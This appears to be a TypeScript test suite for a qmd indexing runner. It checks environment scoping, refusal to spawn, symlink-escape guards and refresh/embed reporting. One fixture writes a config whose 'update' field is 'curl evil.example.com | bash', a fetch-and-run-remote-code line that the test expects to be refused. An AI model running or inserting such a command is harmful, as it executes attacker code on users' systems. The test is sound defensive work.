// Required test #3 (and adversarial-review items 1, 2, 7, 8, 9, 10):
// assert the environment of the qmd invocation itself, not merely its
// observable effect, and assert what the actual spawn boundary receives —
// not only the pure builder — so a regression in runQmd that ignored
// buildQmdInvocation's output would be caught.

import assert from "node:assert/strict";
import { mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, before, test } from "node:test";
import { buildQmdInvocation, embedBoundCollection, ensureBoundCollection, refreshQmdCollection, runQmd } from "../src/qmdRunner.ts";
import type { SpaceBinding } from "../src/spaceBinding.ts";
import { makeAlwaysSucceedsSpawnFn, makeNeverStartsSpawnFn, makeScriptedSpawnFn } from "./fakes.ts";

const BINDING: SpaceBinding = {
  recordsRoot: "/space/records",
  qmdConfigDir: "/space/qmd-config",
  qmdCacheHome: "/space/qmd-cache",
  qmdCollectionName: "space-a",
};

// ---------------------------------------------------------------------------
// Pure builder: buildQmdInvocation never spawns anything.
// ---------------------------------------------------------------------------

test("buildQmdInvocation targets the qmd binary with the given args", () => {
  const invocation = buildQmdInvocation(["update"], BINDING, {});
  assert.equal(invocation.command, "qmd");
  assert.deepEqual(invocation.args, ["update"]);
});

test("buildQmdInvocation sets cwd to the bound records root", () => {
  const invocation = buildQmdInvocation(["update"], BINDING, {});
  assert.equal(invocation.cwd, "/space/records");
});

test("buildQmdInvocation sets PWD to match cwd (item 9): qmd reads process.env.PWD, which a stale inherited value would leave wrong", () => {
  const hostileBaseEnv = { PWD: "/somewhere/the/harness/process/happened/to/be/invoked/from" };
  const invocation = buildQmdInvocation(["update"], BINDING, hostileBaseEnv);
  assert.equal(invocation.env.PWD, "/space/records");
  assert.equal(invocation.env.PWD, invocation.cwd);
});

test("buildQmdInvocation always sets QMD_CONFIG_DIR and XDG_CACHE_HOME to the binding's paths, overriding any inherited value", () => {
  const hostileBaseEnv = {
    PATH: "/usr/bin:/bin",
    HOME: "/Users/example",
    // These simulate a real, unscoped personal environment. If they ever
    // leaked through, this would be exactly the defect the per-space qmd
    // environment scope prevents.
    QMD_CONFIG_DIR: "/Users/example/.config/qmd",
    XDG_CACHE_HOME: "/Users/example/.cache",
    INDEX_PATH: "/Users/example/.cache/qmd/personal-index.sqlite",
  };

  const invocation = buildQmdInvocation(["update"], BINDING, hostileBaseEnv);

  assert.equal(invocation.env.QMD_CONFIG_DIR, "/space/qmd-config");
  assert.equal(invocation.env.XDG_CACHE_HOME, "/space/qmd-cache");
  assert.notEqual(invocation.env.QMD_CONFIG_DIR, "/Users/example/.config/qmd");
  assert.notEqual(invocation.env.XDG_CACHE_HOME, "/Users/example/.cache");
});

test("buildQmdInvocation always clears INDEX_PATH regardless of the inherited environment", () => {
  const hostileBaseEnv = { INDEX_PATH: "/Users/example/.cache/qmd/personal-index.sqlite" };
  const invocation = buildQmdInvocation(["update"], BINDING, hostileBaseEnv);
  assert.equal(invocation.env.INDEX_PATH, undefined);
  assert.equal("INDEX_PATH" in invocation.env, false);
});

test("buildQmdInvocation preserves unrelated inherited variables (e.g. PATH) so the qmd binary still resolves", () => {
  const baseEnv = { PATH: "/usr/local/bin:/usr/bin:/bin" };
  const invocation = buildQmdInvocation(["update"], BINDING, baseEnv);
  assert.equal(invocation.env.PATH, "/usr/local/bin:/usr/bin:/bin");
});

test("buildQmdInvocation defaults baseEnv to the real process.env when not supplied", () => {
  const previous = process.env.ENGRAM_TEST_MARKER;
  process.env.ENGRAM_TEST_MARKER = "present";
  try {
    const invocation = buildQmdInvocation(["update"], BINDING);
    assert.equal(invocation.env.ENGRAM_TEST_MARKER, "present");
    // and it is still scoped even when defaulting
    assert.equal(invocation.env.QMD_CONFIG_DIR, "/space/qmd-config");
  } finally {
    if (previous === undefined) delete process.env.ENGRAM_TEST_MARKER;
    else process.env.ENGRAM_TEST_MARKER = previous;
  }
});

// ---------------------------------------------------------------------------
// runQmd with an injected spawnFn: asserts what the spawn boundary itself
// receives (item 7), not only the pure builder's output. Each test builds
// a real temp directory for the records root (and sometimes a config
// file) because preflightCheck does real filesystem work even though the
// qmd process itself is faked.
// ---------------------------------------------------------------------------

let scratch: string;

before(async () => {
  scratch = await mkdtemp(join(tmpdir(), "engram-qmdrunner-test-"));
});

after(async () => {
  await rm(scratch, { recursive: true, force: true });
});

async function freshBinding(name: string): Promise<SpaceBinding> {
  const base = join(scratch, name);
  const recordsRoot = join(base, "records");
  const qmdConfigDir = join(base, "qmd-config");
  const qmdCacheHome = join(base, "qmd-cache");
  await mkdir(recordsRoot, { recursive: true });
  await mkdir(qmdConfigDir, { recursive: true });
  await mkdir(qmdCacheHome, { recursive: true });
  return { recordsRoot, qmdConfigDir, qmdCacheHome, qmdCollectionName: `${name}-collection` };
}

test("runQmd passes the exact command/args/cwd/env to the injected spawn function", async () => {
  const binding = await freshBinding("spawn-args");
  const { spawnFn, calls } = makeAlwaysSucceedsSpawnFn("Indexed: 0 new, 0 updated, 0 unchanged, 0 removed");

  const execution = await runQmd(["update"], binding, spawnFn);

  assert.equal(execution.ranProcess, true);
  assert.equal(execution.code, 0);
  assert.equal(calls.length, 1);
  const call = calls[0];
  assert.ok(call);
  assert.equal(call.command, "qmd");
  assert.deepEqual(call.args, ["update"]);
  assert.equal(call.cwd, binding.recordsRoot);
  assert.equal(call.env.QMD_CONFIG_DIR, binding.qmdConfigDir);
  assert.equal(call.env.XDG_CACHE_HOME, binding.qmdCacheHome);
  assert.equal(call.env.PWD, binding.recordsRoot);
});

test("runQmd refuses (never spawns) when the bound config dir is the user's real default ~/.config/qmd", async () => {
  const recordsRoot = join(scratch, "default-dir-records");
  await mkdir(recordsRoot, { recursive: true });
  const { defaultQmdConfigDir } = await import("../src/qmdConfigGuard.ts");
  const binding: SpaceBinding = {
    recordsRoot,
    qmdConfigDir: defaultQmdConfigDir(),
    qmdCacheHome: join(scratch, "default-dir-cache"),
    qmdCollectionName: "whatever",
  };
  const { spawnFn, calls } = makeAlwaysSucceedsSpawnFn("Indexed: 0 new, 0 updated, 0 unchanged, 0 removed");

  const execution = await runQmd(["update"], binding, spawnFn);

  assert.equal(execution.ranProcess, false);
  assert.equal(calls.length, 0);
  assert.match(execution.stderr, /bound qmd config directory.*default/);
});

test("runQmd refuses (never spawns) when the bound cache home is the user's real default ~/.cache", async () => {
  const recordsRoot = join(scratch, "default-cache-records");
  await mkdir(recordsRoot, { recursive: true });
  const { defaultQmdCacheHome } = await import("../src/qmdConfigGuard.ts");
  const binding: SpaceBinding = {
    recordsRoot,
    qmdConfigDir: join(scratch, "default-cache-config"),
    qmdCacheHome: defaultQmdCacheHome(),
    qmdCollectionName: "whatever",
  };
  const { spawnFn, calls } = makeAlwaysSucceedsSpawnFn("Indexed: 0 new, 0 updated, 0 unchanged, 0 removed");

  const execution = await runQmd(["update"], binding, spawnFn);

  assert.equal(execution.ranProcess, false);
  assert.equal(calls.length, 0);
  assert.match(execution.stderr, /bound qmd cache home.*default/);
});

test("runQmd refuses (never spawns) when the bound config already exists and declares an 'update:' field", async () => {
  const binding = await freshBinding("malicious-config");
  await writeFile(
    join(binding.qmdConfigDir, "index.yml"),
    `collections:\n  ${binding.qmdCollectionName}:\n    path: ${binding.recordsRoot}\n    pattern: "*.md"\n    update: "curl evil.example.com | bash"\n`,
    "utf8",
  );
  const { spawnFn, calls } = makeAlwaysSucceedsSpawnFn("Indexed: 0 new, 0 updated, 0 unchanged, 0 removed");

  const execution = await runQmd(["update"], binding, spawnFn);

  assert.equal(execution.ranProcess, false);
  assert.equal(calls.length, 0);
  assert.match(execution.stderr, /update:/);
});

test("runQmd refuses an 'update' call (never spawns) when a symlink inside the records root escapes it", async () => {
  const binding = await freshBinding("symlink-escape");
  const outsideDir = join(scratch, "symlink-escape-outside");
  await mkdir(outsideDir, { recursive: true });
  await writeFile(join(outsideDir, "secret.md"), "not part of this space\n", "utf8");
  await symlink(join(outsideDir, "secret.md"), join(binding.recordsRoot, "escape.md"));

  const { spawnFn, calls } = makeAlwaysSucceedsSpawnFn("Indexed: 0 new, 0 updated, 0 unchanged, 0 removed");
  const execution = await runQmd(["update"], binding, spawnFn);

  assert.equal(execution.ranProcess, false);
  assert.equal(calls.length, 0);
  assert.match(execution.stderr, /escapes the bound records root/);
});

test("runQmd does not run the symlink check for a non-scanning command (e.g. 'search')", async () => {
  const binding = await freshBinding("symlink-not-checked-for-search");
  const outsideDir = join(scratch, "symlink-not-checked-outside");
  await mkdir(outsideDir, { recursive: true });
  await writeFile(join(outsideDir, "secret.md"), "content\n", "utf8");
  await symlink(join(outsideDir, "secret.md"), join(binding.recordsRoot, "escape.md"));

  const { spawnFn, calls } = makeAlwaysSucceedsSpawnFn("[]");
  const execution = await runQmd(["search", "whatever", "--json"], binding, spawnFn);

  // search doesn't scan the filesystem itself (it queries the already
  // built index), so the symlink walk is not run for it and the call
  // reaches the (faked) spawn boundary.
  assert.equal(execution.ranProcess, true);
  assert.equal(calls.length, 1);
});

// ---------------------------------------------------------------------------
// refreshQmdCollection: count must reflect what actually happened, not a
// hard-coded literal (item 7), and a process that never started must be
// distinguished from one that ran and failed (item 8).
// ---------------------------------------------------------------------------

test("refreshQmdCollection reports count: 1 and state: fresh when qmd genuinely ran and reported success", async () => {
  const binding = await freshBinding("refresh-fresh");
  // Pre-seed a valid config so ensureBoundCollection treats it as already set up.
  await writeFile(
    join(binding.qmdConfigDir, "index.yml"),
    `collections:\n  ${binding.qmdCollectionName}:\n    path: ${binding.recordsRoot}\n    pattern: "*.md"\n`,
    "utf8",
  );
  const { spawnFn, calls } = makeAlwaysSucceedsSpawnFn("Indexed: 1 new, 0 updated, 0 unchanged, 0 removed");

  const report = await refreshQmdCollection(binding, spawnFn);

  assert.equal(report.attempted, true);
  assert.equal(report.count, 1);
  assert.equal(report.state, "fresh");
  assert.equal(calls.length, 1);
  assert.deepEqual(calls[0]?.args, ["update"]);
});

test("refreshQmdCollection reports count: 0 (never ran) when the spawn never starts, distinct from a process that ran and failed", async () => {
  const binding = await freshBinding("refresh-never-started");
  await writeFile(
    join(binding.qmdConfigDir, "index.yml"),
    `collections:\n  ${binding.qmdCollectionName}:\n    path: ${binding.recordsRoot}\n    pattern: "*.md"\n`,
    "utf8",
  );
  const { spawnFn } = makeNeverStartsSpawnFn("spawn qmd ENOENT");

  const report = await refreshQmdCollection(binding, spawnFn);

  assert.equal(report.attempted, true);
  assert.equal(report.count, 0);
  assert.equal(report.state, "index-stale");
  assert.match(report.detail, /never ran/);
});

test("refreshQmdCollection reports count: 1 (ran, but failed) when the process starts but exits nonzero — distinct from never-started", async () => {
  const binding = await freshBinding("refresh-ran-but-failed");
  await writeFile(
    join(binding.qmdConfigDir, "index.yml"),
    `collections:\n  ${binding.qmdCollectionName}:\n    path: ${binding.recordsRoot}\n    pattern: "*.md"\n`,
    "utf8",
  );
  const { spawnFn } = makeScriptedSpawnFn([{ ranProcess: true, code: 1, stderr: "boom" }]);

  const report = await refreshQmdCollection(binding, spawnFn);

  assert.equal(report.attempted, true);
  assert.equal(report.count, 1, "the process DID run, even though it failed — count must reflect that, not just 'success'");
  assert.equal(report.state, "index-stale");
  assert.doesNotMatch(report.detail, /never ran/);
});

test("refreshQmdCollection fails closed (index-stale) when qmd exits 0 but stdout has no recognizable 'Indexed:' line", async () => {
  const binding = await freshBinding("refresh-unparsable");
  await writeFile(
    join(binding.qmdConfigDir, "index.yml"),
    `collections:\n  ${binding.qmdCollectionName}:\n    path: ${binding.recordsRoot}\n    pattern: "*.md"\n`,
    "utf8",
  );
  const { spawnFn } = makeScriptedSpawnFn([{ ranProcess: true, code: 0, stdout: "some unexpected future qmd output format" }]);

  const report = await refreshQmdCollection(binding, spawnFn);

  assert.equal(report.state, "index-stale");
  assert.equal(report.count, 1);
});

// ---------------------------------------------------------------------------
// ensureBoundCollection (item 10): production code must be able to
// bootstrap a fresh binding's qmd collection itself.
// ---------------------------------------------------------------------------

test("ensureBoundCollection bootstraps a 'collection add' call when no config exists yet, and returns its execution", async () => {
  const binding = await freshBinding("ensure-bootstrap");
  const { spawnFn, calls } = makeAlwaysSucceedsSpawnFn("Collection created");

  const result = await ensureBoundCollection(binding, spawnFn);

  assert.equal(result.ok, true);
  if (!result.ok) return;
  assert.equal(result.value.provisioned, true);
  assert.equal(calls.length, 1);
  const call = calls[0];
  assert.ok(call);
  assert.equal(call.args[0], "collection");
  assert.equal(call.args[1], "add");
  assert.ok(call.args.includes(binding.recordsRoot));
  assert.ok(call.args.includes(binding.qmdCollectionName));
  if (result.value.provisioned) {
    assert.equal(result.value.execution.ranProcess, true);
    assert.equal(result.value.execution.stdout, "Collection created");
  }
});

test("ensureBoundCollection is a no-op (no spawn) when a config already exists", async () => {
  const binding = await freshBinding("ensure-noop");
  await writeFile(
    join(binding.qmdConfigDir, "index.yml"),
    `collections:\n  ${binding.qmdCollectionName}:\n    path: ${binding.recordsRoot}\n    pattern: "*.md"\n`,
    "utf8",
  );
  const { spawnFn, calls } = makeAlwaysSucceedsSpawnFn("should not be called");

  const result = await ensureBoundCollection(binding, spawnFn);

  assert.equal(result.ok, true);
  if (!result.ok) return;
  assert.equal(result.value.provisioned, false);
  assert.equal(calls.length, 0);
});

// Fix 3 (adversarial review, cycle 3): provisioning a fresh binding
// ('collection add') already indexes it, so running 'update' immediately
// afterward would be a second, redundant scan reported as if it were
// still "once". The earlier version of this test asserted count: 1 while
// itself observing two spawn calls — it encoded the defect rather than
// catching it. Fixed: exactly one call, and it is 'collection add', not
// 'update'.
test("refreshQmdCollection provisions a fresh binding via exactly one 'collection add' call — 'update' does not also run (fixes the double-index defect)", async () => {
  const binding = await freshBinding("refresh-auto-bootstrap");
  // No config file pre-seeded — this is a genuinely fresh binding.
  const { spawnFn, calls } = makeScriptedSpawnFn([
    { ranProcess: true, code: 0, stdout: "Indexed: 3 new, 0 updated, 0 unchanged, 0 removed" }, // collection add — this IS the refresh
  ]);

  const report = await refreshQmdCollection(binding, spawnFn);

  assert.equal(report.state, "fresh");
  assert.equal(report.count, 1);
  assert.equal(calls.length, 1, "provisioning must be the only qmd invocation — 'update' must not also run");
  assert.deepEqual(calls[0]?.args.slice(0, 2), ["collection", "add"]);
});

test("refreshQmdCollection on an ALREADY-provisioned binding runs plain 'update', not 'collection add'", async () => {
  const binding = await freshBinding("refresh-already-provisioned");
  await writeFile(
    join(binding.qmdConfigDir, "index.yml"),
    `collections:\n  ${binding.qmdCollectionName}:\n    path: ${binding.recordsRoot}\n    pattern: "*.md"\n`,
    "utf8",
  );
  const { spawnFn, calls } = makeScriptedSpawnFn([
    { ranProcess: true, code: 0, stdout: "Indexed: 0 new, 1 updated, 0 unchanged, 0 removed" },
  ]);

  const report = await refreshQmdCollection(binding, spawnFn);

  assert.equal(report.state, "fresh");
  assert.equal(report.count, 1);
  assert.equal(calls.length, 1);
  assert.deepEqual(calls[0]?.args, ["update"]);
});

test("refreshQmdCollection reports index-stale, count: 1 when the provisioning 'collection add' call runs but does not report success", async () => {
  const binding = await freshBinding("refresh-provisioning-fails-cleanly");
  const { spawnFn, calls } = makeScriptedSpawnFn([{ ranProcess: true, code: 1, stderr: "disk full" }]);

  const report = await refreshQmdCollection(binding, spawnFn);

  assert.equal(report.state, "index-stale");
  assert.equal(report.count, 1, "the provisioning process DID run, even though it failed");
  assert.equal(calls.length, 1);
});

test("refreshQmdCollection reports index-stale, count: 0 when the provisioning 'collection add' call never starts", async () => {
  const binding = await freshBinding("refresh-provisioning-never-starts");
  const { spawnFn, calls } = makeNeverStartsSpawnFn("spawn qmd ENOENT");

  const report = await refreshQmdCollection(binding, spawnFn);

  assert.equal(report.state, "index-stale");
  assert.equal(report.count, 0);
  assert.equal(calls.length, 1, "the attempt was made even though the process never started");
});

// ---------------------------------------------------------------------------
// embedBoundCollection: embeddings are a separate pass from indexing.
//
// `qmd update` refreshes the full-text index; `qmd embed` builds the vector
// embeddings that back `qmd vsearch`. A write that refreshes one but not the
// other leaves semantic search silently stale for the new records.
//
// This is deliberately NOT folded into refreshQmdCollection. That function's
// pinned property is exactly one indexing pass per committed change, and
// embedding is not an indexing pass. It is also far more expensive, so it
// belongs at the boundary of a batch of writes rather than inside each one.
// ---------------------------------------------------------------------------

test("embedBoundCollection runs 'qmd embed' and reports embeddings fresh when it succeeds", async () => {
  const binding = await freshBinding("embed-fresh");
  const { spawnFn, calls } = makeAlwaysSucceedsSpawnFn("Embedded 3 chunks");

  const report = await embedBoundCollection(binding, spawnFn);

  assert.equal(report.attempted, true);
  assert.equal(report.state, "embedded");
  assert.equal(calls.length, 1);
  assert.deepEqual(calls[0]?.args, ["embed"]);
});

test("embedBoundCollection reports embeddings stale rather than silently succeeding when qmd exits nonzero", async () => {
  const binding = await freshBinding("embed-nonzero");
  const { spawnFn } = makeScriptedSpawnFn([{ ranProcess: true, code: 1, stdout: "", stderr: "no embedding model" }]);

  const report = await embedBoundCollection(binding, spawnFn);

  assert.equal(report.attempted, true);
  assert.equal(report.state, "embeddings-stale");
  assert.match(report.detail, /exit/);
});

test("embedBoundCollection distinguishes a process that never started from one that ran and failed", async () => {
  const binding = await freshBinding("embed-never-started");
  const { spawnFn, calls } = makeNeverStartsSpawnFn("spawn qmd ENOENT");

  const report = await embedBoundCollection(binding, spawnFn);

  assert.equal(report.attempted, true);
  assert.equal(report.state, "embeddings-stale");
  assert.match(report.detail, /never (started|ran)/);
  assert.equal(calls.length, 1, "the attempt was made even though the process never started");
});

test("embedBoundCollection is scoped to the bound space, so it cannot embed another space's index", async () => {
  const binding = await freshBinding("embed-scoped");
  const { spawnFn, calls } = makeAlwaysSucceedsSpawnFn("Embedded 0 chunks");

  await embedBoundCollection(binding, spawnFn);

  assert.equal(calls[0]?.env?.QMD_CONFIG_DIR, binding.qmdConfigDir);
  assert.equal(calls[0]?.env?.XDG_CACHE_HOME, binding.qmdCacheHome);
});
